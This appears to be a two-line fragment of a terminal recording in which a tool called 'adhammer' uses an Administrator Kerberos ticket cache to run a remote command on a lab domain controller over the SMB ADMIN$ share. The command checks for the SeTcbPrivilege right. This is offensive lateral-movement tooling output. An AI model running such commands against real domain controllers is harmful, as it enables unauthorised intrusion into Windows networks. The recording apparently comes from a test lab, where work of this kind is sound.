[27.8, "o", "\u001b[35m$\u001b[0m adhammer attack exec --host DC01.testlab.local --realm testlab.local --user Administrator --ccache admin.ccache --cmd 'whoami /priv | findstr SeTcbPrivilege'\r\n"]
[29.8, "o", "\u001b[36m[*]\u001b[0m SMB2 tree-connect \\\\DC01.testlab.local\\ADMIN$ (Kerberos AP-REQ, mutual)\r\n"]
